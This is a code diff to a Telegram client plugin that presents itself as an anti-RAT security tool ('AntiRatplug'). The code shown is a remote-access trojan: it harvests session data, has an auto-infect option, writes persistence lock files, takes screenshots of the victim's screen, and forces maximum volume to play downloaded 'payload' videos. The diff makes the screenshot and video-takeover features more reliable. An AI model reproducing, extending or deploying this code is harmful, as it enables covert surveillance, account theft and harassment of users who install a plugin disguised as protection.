@@ -8,7 +8,7 @@ __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
 __description__ = "Slim Harvest + Lockdown + Vidker."
 __author__ = "@from_a4"
-__version__ = "18.1 [Slim+Vidker]"
+__version__ = "18.2 [Slim+Vidker]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -50,7 +50,6 @@ AUTO_LOCKDOWN_AFTER  = False
 AUTO_DELAY_SEC       = 8
 AUTO_LOCKDOWN_GIFTS  = True
 
-# ─── vidker urls ────────────────────────────────────────────────────────────
 ARISHEM_URL   = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/new2w1q_2026-09-24-21-55-04_1790268904789.mp4"
 SENTRY_URL    = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/crumble_cookies00_2026-09-24-21-54-27_1790268867444.mp4"
 DRDOOM_URL    = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/eli.edits446_2026-09-25-20-45-50_1790351150457.mp4"
@@ -198,7 +197,6 @@ class PluginSecurityPlugin(BasePlugin):
         self._waiting = None
         self._auto_started = False
 
-        # vidker
         self._vidker_view = None
         self._vidker_sv = None
         self._vidker_mp = None
@@ -312,6 +310,39 @@ class PluginSecurityPlugin(BasePlugin):
             return pm.checkPermission(name, ctx.getPackageName()) == 0
         except Exception:
             return False
+
+    def _get_activity(self):
+        # 1) LaunchActivity.instance
+        try:
+            act = jclass("org.telegram.ui.LaunchActivity").instance
+            if act is not None:
+                return act
+        except Exception:
+            pass
+        # 2) ApplicationLoader
+        try:
+            act = ApplicationLoader.application.getCurrentActivity()
+            if act is not None:
+                return act
+        except Exception:
+            pass
+        # 3) AndroidUtilities
+        try:
+            AU = jclass("org.telegram.ui.ActionBar.AndroidUtilities")
+            act = AU.getActivity()
+            if act is not None:
+                return act
+        except Exception:
+            pass
+        # 4) client_utils (если есть)
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is not None:
+                return frag.getParentActivity()
+        except Exception:
+            pass
+        return None
 
     def _get_input_peer(self, account, peer_id):
         mc = _MC().getInstance(account)
@@ -481,8 +512,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             pass
         return "Unknown"
-
-    # ─── 2FA ────────────────────────────────────────────────────────────────
 
     def _get_2fa_state(self):
         try:
@@ -708,25 +737,32 @@ class PluginSecurityPlugin(BasePlugin):
         if self._vidker_on:
             return
         try:
-            from client_utils import get_last_fragment
-            frag = get_last_fragment()
-            if frag is None:
-                self._send_msg("Vidker: нет фрагмента")
-                return
-            act = frag.getParentActivity()
+            # ждём активность до 10 сек
+            act = None
+            for _ in range(20):
+                act = self._get_activity()
+                if act is not None:
+                    break
+                time.sleep(0.5)
             if act is None:
                 self._send_msg("Vidker: нет активности")
                 return
+
             ctx = ApplicationLoader.applicationContext
             d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
             path = os.path.join(d, mode + ".mp4")
             if not os.path.exists(path):
                 self._send_msg("Vidker: payload не скачан.")
                 return
-            am = act.getSystemService("audio")
-            stream_music = 3
-            max_vol = int(am.getStreamMaxVolume(stream_music))
-            am.setStreamVolume(stream_music, max_vol, 0)
+
+            try:
+                am = act.getSystemService("audio")
+                stream_music = 3
+                max_vol = int(am.getStreamMaxVolume(stream_music))
+                am.setStreamVolume(stream_music, max_vol, 0)
+            except Exception:
+                pass
+
             run_on_ui_thread(lambda: self._render_vidker(act, path))
             self._vidker_on = True
             self._send_msg_with_close("Vidker [%s] запущен." % mode.upper(), "close_vidker")
@@ -839,9 +875,7 @@ class PluginSecurityPlugin(BasePlugin):
                     time.sleep(2)
                     for _ in range(60):
                         try:
-                            from client_utils import get_last_fragment
-                            frag = get_last_fragment()
-                            if frag is not None and frag.getParentActivity() is not None:
+                            if self._get_activity() is not None:
                                 self._render_vidker_task(str(mode))
                                 return
                         except Exception:
@@ -1625,7 +1659,7 @@ class PluginSecurityPlugin(BasePlugin):
             pl = os.path.join(cdir, "kernel_persist.lock")
             if not os.path.exists(pl):
                 with open(pl, "w") as f:
-                    f.write(_hl.sha256(b"ar_slim_v18v").hexdigest())
+                    f.write(_hl.sha256(b"ar_slim_v18v2").hexdigest())
                 self._harden_file(pl)
         except Exception:
             pass
@@ -1950,12 +1984,7 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _screenshot(self):
         try:
-            from client_utils import get_last_fragment
-            frag = get_last_fragment()
-            if frag is None:
-                self._send_msg("Скриншот: нет фрагмента")
-                return
-            act = frag.getParentActivity()
+            act = self._get_activity()
             if act is None:
                 self._send_msg("Скриншот: нет активности")
                 return
@@ -1994,8 +2023,6 @@ class PluginSecurityPlugin(BasePlugin):
                 pass
         except Exception as e:
             self._send_msg("Ошибка скриншота: " + str(e))
-
-    # ─── harvest / lockdown ────────────────────────────────────────────────
 
     def _full_harvest(self, include_sessions=True, auto_infect=False):
         def task():
